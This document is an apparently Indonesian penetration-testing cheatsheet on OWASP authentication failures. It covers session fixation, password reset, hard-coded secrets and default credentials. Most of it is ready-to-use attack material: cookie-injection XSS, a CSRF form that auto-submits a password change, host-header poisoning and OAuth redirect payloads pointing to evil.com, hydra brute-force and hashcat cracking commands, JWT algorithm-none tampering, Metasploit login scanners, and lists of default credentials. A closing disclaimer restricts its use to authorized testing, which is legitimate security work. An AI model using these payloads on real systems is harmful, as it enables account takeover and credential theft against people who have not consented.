# 🔑 AUTHENTICATION FAILURES CHEATSHEET — Part 07B

## OWASP A07:2021 — Session, Credentials, Password Recovery, Default Creds

---

## 📑 Table of Contents (07B)
1. [CWE-384: Session Fixation](#cwe-384-session-fixation)
2. [CWE-613: Insufficient Session Expiration](#cwe-613-insufficient-session-expiration)
3. [CWE-521: Weak Password Requirements](#cwe-521-weak-password-requirements)
4. [CWE-620: Unverified Password Change](#cwe-620-unverified-password-change)
5. [CWE-640: Weak Password Recovery](#cwe-640-weak-password-recovery)
6. [CWE-258/259/798: Hard-coded & Empty Passwords](#cwe-258259798-hard-coded--empty-passwords)
7. [CWE-1390/1391: Weak Authentication & Credentials](#cwe-13901391-weak-authentication--credentials)
8. [CWE-1392/1393: Default Credentials & Passwords](#cwe-13921393-default-credentials--passwords)
9. [CWE-940/941: Communication Channel Verification](#cwe-940941-communication-channel-verification)

---

# CWE-384: Session Fixation

**Deskripsi**: Penyerang memaksa user untuk menggunakan session ID yang sudah diketahui penyerang.

## Exploitation

```bash
# ===== ATTACK FLOW =====
# 1. Attacker gets a valid session ID dari target app
# 2. Attacker mengirim link ke victim: https://target.com/?SID=KNOWN_SESSION
# 3. Victim login dengan session ID tersebut
# 4. Attacker menggunakan session ID yang sama → authenticated as victim

# ===== TEST =====
# 1. Get session ID sebelum login
curl -c cookies.txt https://target.com/login
cat cookies.txt
# Session: PHPSESSID=abc123

# 2. Login
curl -b "PHPSESSID=abc123" -d "user=admin&pass=admin" https://target.com/login

# 3. Check: apakah session ID berubah setelah login?
# Jika TETAP abc123 → VULNERABLE (session fixation)
# Jika BERUBAH ke xyz789 → SAFE (session regenerated)

# ===== TECHNIQUES =====
# URL parameter
https://target.com/login?PHPSESSID=attacker_known_session
https://target.com/login;jsessionid=attacker_known_session

# Cookie injection via XSS
<script>document.cookie="PHPSESSID=attacker_session"</script>

# Cookie injection via subdomain
# If attacker controls sub.target.com:
Set-Cookie: session=attacker_value; Domain=.target.com

# Meta tag injection
<meta http-equiv="Set-Cookie" content="PHPSESSID=attacker_session">

# ===== VERIFICATION CHECKLIST =====
# [ ] Session ID regenerated after login?
# [ ] Old session ID invalidated?
# [ ] Session ID in URL rejected?
# [ ] Session bound to user/IP?
```

---

# CWE-613: Insufficient Session Expiration

```bash
# ===== TEST SESSION TIMEOUT =====

# 1. Login & get session token
curl -c cookies.txt -d "user=admin&pass=admin" https://target.com/login

# 2. Wait (30min, 1hr, 24hr)
# 3. Test if session still valid
curl -b cookies.txt https://target.com/dashboard
# If still authenticated → VULNERABLE

# ===== TEST LOGOUT INVALIDATION =====
# 1. Login, get session token
# 2. Logout
# 3. Reuse old session token
curl -b "session=OLD_TOKEN" https://target.com/dashboard
# If still works → Server not invalidating session on logout

# ===== COMMON ISSUES =====
# - Session never expires (infinite lifetime)
# - Session timeout too long (24+ hours)
# - Logout doesn't invalidate server-side session
# - JWT with no expiration (no "exp" claim)
# - Refresh tokens never expire
# - Remember-me tokens too long-lived
# - Sessions survive password change
# - Active sessions not terminated on password reset

# ===== JWT EXPIRATION CHECK =====
# Decode JWT and check "exp" claim
echo "JWT_TOKEN" | cut -d. -f2 | base64 -d
# {"sub":"admin","exp":1735689600}
# If no "exp" → never expires
# If exp is far future → too long

# Check: after password change, are old JWTs still valid?
```

---

# CWE-521: Weak Password Requirements

```bash
# ===== TEST PASSWORD POLICY =====
# Try registering/changing password with weak values:

# Length
a                  # 1 char
aa                 # 2 chars
aaa                # 3 chars
123456             # 6 chars (no complexity)

# Complexity
password           # Common word
12345678           # Numbers only
abcdefgh           # Lowercase only
ABCDEFGH           # Uppercase only
qwerty             # Keyboard pattern
admin123           # Predictable

# Same as username
admin/admin
user/user
test/test

# Blank/empty
(empty string)

# Common passwords
password
123456
12345678
password1
admin
letmein
welcome
monkey
dragon

# ===== CHECK =====
# [ ] Minimum length enforced? (recommended: 8+)
# [ ] Complexity requirements? (upper/lower/digit/special)
# [ ] Common password blocklist?
# [ ] Username in password blocked?
# [ ] Password reuse prevention?
# [ ] Maximum length? (should allow long passphrases)
```

---

# CWE-620: Unverified Password Change

```bash
# ===== TEST PASSWORD CHANGE WITHOUT OLD PASSWORD =====

# Normal flow:
POST /api/change-password
{"old_password":"current","new_password":"new123","confirm":"new123"}

# Attack 1: Remove old_password field
POST /api/change-password
{"new_password":"hacked123","confirm":"hacked123"}

# Attack 2: Empty old_password
POST /api/change-password
{"old_password":"","new_password":"hacked123","confirm":"hacked123"}

# Attack 3: Wrong old_password accepted
POST /api/change-password
{"old_password":"wrong","new_password":"hacked123","confirm":"hacked123"}

# Attack 4: CSRF + Password Change (no old password)
<form action="https://target.com/api/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm" value="hacked123">
</form>
<script>document.forms[0].submit()</script>

# Attack 5: Change other user's password (IDOR)
POST /api/change-password
{"user_id":1002,"new_password":"hacked123"}
```

---

# CWE-640: Weak Password Recovery

```bash
# ===== PASSWORD RESET FLOW ATTACKS =====

# 1. HOST HEADER POISONING
POST /forgot-password HTTP/1.1
Host: evil.com
{"email":"victim@target.com"}
# Reset link: https://evil.com/reset?token=SECRET
# Victim clicks → attacker gets token

# 2. TOKEN PREDICTION
# Check if reset tokens are:
# - Sequential: token=1001, 1002, 1003
# - Timestamp-based: token=1619712000 (Unix timestamp)
# - Weak random: token=abc123 (short, guessable)
# - MD5 of email: token=MD5(victim@target.com)

# 3. TOKEN BRUTE FORCE
# If token is 4-6 digit: brute force 0000-999999
ffuf -u "https://target.com/reset?token=FUZZ" -w numbers.txt -mc 200

# 4. TOKEN REUSE
# Use same reset token multiple times
# Token should be one-time use

# 5. TOKEN NO EXPIRATION
# Wait 24hrs+ → try old token
# Token should expire in 15-60 min

# 6. SECURITY QUESTIONS BYPASS
# OSINT to find answers
# Common weak questions:
# - Mother's maiden name → social media
# - First pet → social media
# - High school → LinkedIn
# - City born → public records

# 7. EMAIL PARAMETER POLLUTION
POST /forgot-password
email=victim@target.com&email=attacker@evil.com
# Some apps send reset to both!

# 8. IDOR IN RESET
POST /reset-password
{"token":"valid_token","user_id":1002,"new_password":"hacked"}
# Change user_id to another user

# 9. RESPONSE MANIPULATION
# Intercept reset response
# Change {"success":false} → {"success":true}

# 10. OTP BYPASS IN RESET
POST /verify-reset-otp
{"email":"victim@target.com","otp":"000000"}
# Try: 000000, 111111, 123456, null, empty, array
```

---

# CWE-258/259/798: Hard-coded & Empty Passwords

## CWE-258: Empty Password in Config

```bash
# ===== FIND EMPTY PASSWORDS =====
# Search config files
grep -rn 'password\s*=' /var/www/ --include="*.conf" --include="*.ini" --include="*.yml" --include="*.env"
grep -rn 'password.*""' /var/www/ --include="*.py" --include="*.js" --include="*.php"
grep -rn "password.*''" /var/www/

# Common locations:
# .env
DB_PASSWORD=
REDIS_PASSWORD=
MAIL_PASSWORD=

# docker-compose.yml
MYSQL_ROOT_PASSWORD: ""

# application.properties (Spring)
spring.datasource.password=
```

## CWE-259/798: Hard-coded Credentials

```bash
# ===== FIND HARDCODED SECRETS =====
# grep
grep -rn "password" /var/www/ --include="*.py" --include="*.js" --include="*.php" --include="*.java"
grep -rn "api_key\|apikey\|api-key" /var/www/
grep -rn "secret\|token\|credential" /var/www/
grep -rn "AWS_SECRET\|AWS_KEY" /var/www/

# trufflehog (git repos)
trufflehog git https://github.com/target/repo --json
trufflehog filesystem /path/to/code

# gitleaks
gitleaks detect -s /path/to/repo -v

# git log search
git log -p --all -S 'password'
git log -p --all -S 'API_KEY'
git log --diff-filter=D -- "*.env"

# GitDorking (GitHub search)
# org:targetcompany password
# org:targetcompany api_key
# org:targetcompany secret
# filename:.env DB_PASSWORD
# filename:wp-config.php

# ===== COMMON HARDCODED PATTERNS =====
# AWS
AKIAIOSFODNN7EXAMPLE              # AWS Access Key (starts AKIA)
wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY  # AWS Secret

# GCP
"type": "service_account"         # GCP Service Account JSON

# Slack
xoxb-*                            # Slack Bot Token
xoxp-*                            # Slack User Token

# GitHub
ghp_*                             # GitHub Personal Access Token

# Stripe
sk_live_*                         # Stripe Secret Key

# Twilio
# Account SID + Auth Token

# Firebase
# apiKey in client-side JavaScript

# ===== TOOLS =====
# Nuclei
nuclei -u https://target.com -tags token,exposure,keys

# SecretFinder (JS files)
python SecretFinder.py -i https://target.com/main.js

# Mantra
mantra -u https://target.com
```

---

# CWE-1390/1391: Weak Authentication & Credentials

```bash
# ===== WEAK AUTH MECHANISMS =====
# Basic auth over HTTP (credentials in plaintext)
curl -v http://target.com/admin
# → WWW-Authenticate: Basic → credentials base64 encoded (NOT encrypted)
echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d
# admin:password

# Digest auth (MD5-based — weak)
# NTLM auth (pass-the-hash possible)

# ===== WEAK CREDENTIALS TEST =====
# Top 100 passwords
hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/top-100.txt \
  target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Credential stuffing
# Use breach databases (HaveIBeenPwned API)
# Match email → try known passwords

# Weak hash detection
# MD5/SHA1 without salt → rainbow table
# Identify hash:
hashid 'HASH_VALUE'
hash-identifier

# Crack weak hashes
hashcat -m 0 hashes.txt rockyou.txt       # MD5
hashcat -m 100 hashes.txt rockyou.txt     # SHA1
hashcat -m 1400 hashes.txt rockyou.txt    # SHA256
# Bcrypt/scrypt/argon2 = strong (slow to crack)
```

---

# CWE-1392/1393: Default Credentials & Passwords

```bash
# ===== DEFAULT CREDENTIAL DATABASES =====
# https://www.cirt.net/passwords
# https://default-password.info/
# https://datarecovery.com/rd/default-passwords/

# ===== COMMON DEFAULT CREDS =====
# Web Apps
admin:admin
admin:password
admin:123456
admin:admin123
root:root
root:toor
test:test
guest:guest
user:user
demo:demo

# Databases
root: (empty)               # MySQL default
postgres:postgres            # PostgreSQL
sa:sa                       # MSSQL
admin:admin                 # MongoDB (no auth default)
redis: (no password)        # Redis default

# Network Devices
admin:admin                 # Many routers
cisco:cisco                 # Cisco
admin:password              # Netgear
admin:1234                  # Zyxel
ubnt:ubnt                   # Ubiquiti

# IoT
admin:admin
root:root
admin:
admin:1234

# CMS
admin:password              # WordPress (install wizard)
admin:admin                 # Joomla
admin:admin                 # Drupal

# Dev Tools
admin:admin                 # Jenkins
admin:admin                 # Grafana
elastic:changeme            # Elasticsearch
admin:admin                 # RabbitMQ
admin:public                # Tomcat
guest:guest                 # RabbitMQ guest

# Cloud / Virtualization
administrator@vsphere.local:VMware1!   # vCenter
admin:nutanix/4u            # Nutanix
root:calvin                 # Dell iDRAC

# ===== TOOLS =====
# Nmap default creds scan
nmap --script http-default-accounts -p 80,443,8080 target.com

# Nuclei default logins
nuclei -u https://target.com -tags default-login

# changeme (default credential scanner)
pip install changeme
changeme -t https://target.com

# Metasploit
use auxiliary/scanner/http/tomcat_mgr_default_creds
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/mysql/mysql_login
```

---

# CWE-940/941: Communication Channel Verification

```bash
# ===== CWE-940: Source Verification =====
# App doesn't verify source of communication
# - WebSocket without origin check
# - API without proper auth on incoming webhooks
# - Callback URLs not validated

# WebSocket origin test
websocat ws://target.com/ws -H "Origin: https://evil.com"
# If connects → no origin check

# Webhook without signature verification
# Attacker sends fake webhook:
curl -X POST https://target.com/api/webhook \
  -H "Content-Type: application/json" \
  -d '{"event":"payment_success","user_id":1001,"amount":999}'

# ===== CWE-941: Destination Verification =====
# App sends data to wrong/unverified destination
# - OAuth redirect_uri not validated
# - Webhook URL controlled by attacker
# - Email/SMS sent to attacker-controlled address

# OAuth redirect_uri manipulation
/authorize?client_id=APP&redirect_uri=https://evil.com/callback
/authorize?client_id=APP&redirect_uri=https://evil.com%40target.com
/authorize?client_id=APP&redirect_uri=https://target.com.evil.com
```

---

## 🔍 Master Auth Testing Pipeline

```bash
# ===== COMPLETE AUTH AUDIT =====

# 1. Default credentials
nuclei -u https://target.com -tags default-login -o defaults.txt

# 2. Brute force test (with rate limit check)
hydra -l admin -P top1000.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid" -t 4 -f

# 3. JWT analysis (if used)
python3 jwt_tool.py TOKEN -T     # Tamper mode
python3 jwt_tool.py TOKEN -X a   # Algorithm none
python3 jwt_tool.py TOKEN -C -d rockyou.txt  # Crack

# 4. Session testing
# → Login, check session regeneration
# → Logout, check session invalidation
# → Wait, check session expiration

# 5. Password reset analysis
# → Test host header poisoning
# → Test token predictability
# → Test token expiration

# 6. CORS check
curl -H "Origin: https://evil.com" -I https://target.com/api/

# 7. Cookie analysis
curl -sI https://target.com | grep -i "set-cookie"

# 8. SSL/TLS
./testssl.sh https://target.com

# 9. Find hardcoded secrets
nuclei -u https://target.com -tags exposure,token
trufflehog filesystem ./

# 10. MFA bypass testing
# → Direct URL access after login
# → OTP brute force
# → Response manipulation
```

---

> ⚠️ **DISCLAIMER**: Semua teknik di cheatsheet ini hanya untuk **ethical hacking** dan **penetration testing yang sudah diotorisasi**. Penggunaan tanpa izin merupakan pelanggaran hukum.
